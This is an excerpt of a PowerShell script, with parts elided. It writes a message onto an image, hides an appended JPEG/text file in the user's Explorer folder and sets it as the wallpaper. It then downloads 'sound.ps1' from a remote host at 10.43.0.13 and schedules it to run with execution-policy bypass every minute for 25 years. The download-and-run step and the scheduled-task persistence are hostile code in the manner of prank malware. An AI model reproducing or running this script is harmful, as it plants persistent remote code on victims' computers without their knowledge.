...
# Draw the user-provided message on the image
$content = Get-Content -Path "$Env:temp\foo.txt" -Raw
...
$centerX = ($bmp.Width - $textSize.Width) / 2
...
cmd.exe /c copy /b "$Env:temp\foo.jpg" + "$Env:temp\foo.txt" "$Env:USERPROFILE\AppData\Local\Microsoft\Windows\Explorer\$ImageName"
...
Set-WallPaper -Image "$Env:USERPROFILE\AppData\Local\Microsoft\Windows\Explorer\$ImageName" -Style Center

Invoke-WebRequest -Uri "http://10.43.0.13:8000/sound.ps1" -OuTFile "C:\Users\Maison\sound.ps1"

$Action = New-ScheduledTaskAction -Execute 'Powershell' -Argument '-ExecutionPolicy Bypass -File "C:\Users\Maison\sound.ps1"'
$date = [DateTime]::Now
$Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minute 1) -RepetitionDuration ($date.AddYears(25)-$date)
